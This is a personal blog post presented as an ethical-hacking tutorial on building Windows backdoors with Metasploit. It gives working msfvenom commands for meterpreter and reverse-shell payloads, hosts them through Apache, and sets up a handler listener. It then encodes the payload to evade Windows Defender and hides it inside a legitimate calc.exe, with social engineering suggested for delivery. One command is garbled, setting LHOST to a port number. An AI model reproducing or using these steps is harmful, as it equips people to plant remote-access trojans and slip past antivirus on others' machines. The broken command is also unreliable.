---
layout: post
title: Create Backdoors - Exploit devices using Metasploit for penetration testing.
date: 2022-03-24 19:07:37.000000000 +01:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Ethical Hacking
- Kali Linux
tags: []
meta:
  _edit_last: '1'
  _aioseo_title: "#post_title"
  _aioseo_description: ''
  _aioseo_keywords: ''
  _aioseo_og_title: ''
  _aioseo_og_description: ''
  _aioseo_og_article_section: ''
  _aioseo_og_article_tags: ''
  _aioseo_twitter_title: ''
  _aioseo_twitter_description: ''
  _wp_page_template: default
author:
  login: GeoTheo
  email: theodorgeor@gmail.com
  display_name: GeoTheo
  first_name: ''
  last_name: ''
permalink: "/ethical-hacking/kali-linux/create-backdoors-exploit-devices-using-metasploit-for-penetration-testing/"
---
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<!-- wp:paragraph --><html><body></p>
<p><strong>IMPORTANT: This post and any other post I upload is written for informational and educational purposes only! DO NOT try this on any network you do not have permission to ethically test.</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Metasploit is the best tool to create backdoors. You can create backdoor for android, windows and other Operating Systems in any extension! We are specifically be working with EXEs and internal network. I know that external is ten times more useful in practice, but  we are doing this just for penetration testing and the result will be the same (whether its internal or external) *1.  So, we are going with the simplest form of a backdoor (You can create more complicated by changing some commands, you will see). Have in mind though that we can create Microsoft documents and other famous file extensions but we would need to use different commands.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>*1 Actually, some routers may not accept the request of the packets when using the external method, so there is a difference, but that is a different scenario.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>There are also many methods to create backdoors. My favorite is using Embedded backdoor inside executable, so that the OS thinks that it is a legit app while it is a backdoor.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The target OS will be Windows, so we will check if the windows antivirus can detect the backdoor we'll make. We will also try encoding the backdoor later.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>IMPORTANT: Also, don't forget that the virtual machine has to be on the same network as the windows machine. For example they both have to be on 192.168.1.0/24. to make that sure, go to the virtual machine's settings and in network tab, choose "bridged adapter" and select the name of your adapter. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2>1. Creating a simple backdoor</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>With Metasploit, we don't need any administrator privileges. So you don't need any sudos here.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>1. Type: "msfvenom -p windows/meterpreter/reverse_tcp LHOST="YourIP" LPORT=4444 -f exe &gt; /home/'Username'/Desktop/reverse.exe"</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here, we call msfvenom to tell Kali that we want to use this tool, then we say what is the host and the protocol we want to use (in our case: reverse_tcp), so that it can configure the code of the backdoor properly. Then, you tell it your ip and a port so that it can send the data from the target to you, using the specified port. Lastly, we put a tag f to demonstrate the extension and a &gt; to tell it the location in which it will be saved.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>You can find your ip using the ifconfig command. You will find it under wlan0 or eth0, it depends on if you use ethernet or wifi:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":90,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-201001.png" alt="" class="wp-image-90"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>On ethernet, the ip is next to ether, and on wifi, the ip is next to inet.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":87,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-183958-1.png" alt="" class="wp-image-87"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Congrats! You created your first backdoor! </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2>2. Transfer the backdoor to the target.</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Note: You should only use YOUR device unless you have permission to do this in someone else's device.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Now, you need to find an efficient way, to transfer files between Kali and other OSs - devices. My favorite way is using apache.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>1. Write "service --status-all" to see all the services running, the ones with a plus are running and the ones with a minus... You know. Watch that apache2 is not running.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>2. Write "service apache2 start" to run apache and input your password in the field that shows up:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":89,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-200511.png" alt="" class="wp-image-89"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>If you run "service --status-all" again you will see that apache has now a +. Now, if you open any browser and type your kali's Ip, you will be able to access a folder of your kali machine. That means that this folder is shared.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>3. Check that it works by typing in a browser your kali's Ip and check if it shows this screen: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":91,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/image-1.png" alt="" class="wp-image-91"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>If it does, you are fine.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>3. create a shared folder going in the apache's folder: "cd /var/www/html" and creating a folder: "mkdir 'anyName' ". I will name it share.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>4. Transfer the backdoor from the location you saved it in this folder. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>4. Now, from a windows machine, you own, go to the browser and type the Kali's Ip and then the folder's name. You will see the backdoor!</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":93,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-202116-1.png" alt="" class="wp-image-93"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Download it and see that the browser detects it. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":96,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-202650-1.png" alt="" class="wp-image-96"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>We want to test the windows defender and actually use the backdoor, so click keep dangerous file.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2>3. Configure the msfconsole and use the backdoor.</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>1. Type msfconsole to start it and wait for it to load.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":97,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203317.png" alt="" class="wp-image-97"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>2. Type "use exploit/multi/handler"</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":98,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203344.png" alt="" class="wp-image-98"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>3. Type "set payload windows/meterpreter/reverse_tcp" to demonstrate the OS (windows) and the protocol (reverse_tcp)</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":99,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203403.png" alt="" class="wp-image-99"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>4. Type "set LHOST 'youKali'sIP' " to tell it where to send the data it will get from the target.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":100,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203433.png" alt="" class="wp-image-100"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>5. Type "set LPORT '4444' " or if you used a different port while creating the backdoor, use the port you inserted.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":102,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203735.png" alt="" class="wp-image-102"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Lastly, type "exploit" and wait for the target to open the backdoor.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":101,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-203500.png" alt="" class="wp-image-101"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Now, go back to your windows and open your backdoor.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Alright... What do we have here?</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>I opened this on windows 11 and it didn't work (we will try using a different way later) as windows defender detected it. However, if you use an older version of windows. For example, windows 7, it works because it windows 7 is not being maintained anymore and is not receiving updates on viruses, hence making it vulnerable. Still, by disable windows defender we can run the backdoor and once we run it, we get these messages on our msfconsole:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":103,"sizeSlug":"full","linkDestination":"none"} --></p>
<figure class="wp-block-image size-full"><img src="{{site.baseurl}}/assets/images/2022/03/Screenshot-2022-03-24-204750.png" alt="" class="wp-image-103"></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Here, by typing "help", we get every command we can execute on the target. My favorite is "screenshare" (it captures the screen of the target) as it is the most powerful in my opinion, though there are many more you can explore by yourself. You can close the backdoor in the task manager.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2>4. Create an encoded backdoor and an embedded exe.</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Let's check if windows defender can detect an encoded backdoor.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>1. Every kali machine has same encoders already preinstalled in a folder, the most famous for backdoors is shikata_ga_nai so this is what we are going to use.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>It is really simple, You just create an actual backdoor but you add the parameter e to say that you want to use encoder. and then you specify a number using the tag i. The greater it is, the more it will encode, though i am not sure what it actually does, if someone knows, I'd appreciated it if you commented.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>"msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.1YourIP' LHOST=4444 -e x86/shikata_ga_nai -i 10 -f exe &gt; /home/geo/Desktop/encoded.exe"</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>2. To create a backdoor and embed it with an exe, you need a working exe and to type the command:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>"msfvenom -p windows/shell_reverse_tcp LHOST='192.168.1.YourIP' LPORT=4444 -x /home/geo/Desktop/calc.exe -f exe -o calculator.exe"</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>instead of calc, put the EXE's name and instead of calculator put any name you want.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Now, you can test if windows 11 is that vulnerable so that any of these methods work.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>There are multiple ways to deploy the backdoor to the target. My personal favorite is social engineering, and kali has many preinstalled tools for this.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>I hope you liked it! ðŸ˜Š</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>If you have any suggestions for future post just comment.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>If you found any mistake in my post, just comment.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>If you have any question, just comment.</p>
<p><!-- /wp:paragraph --><br />
</body></html></p>
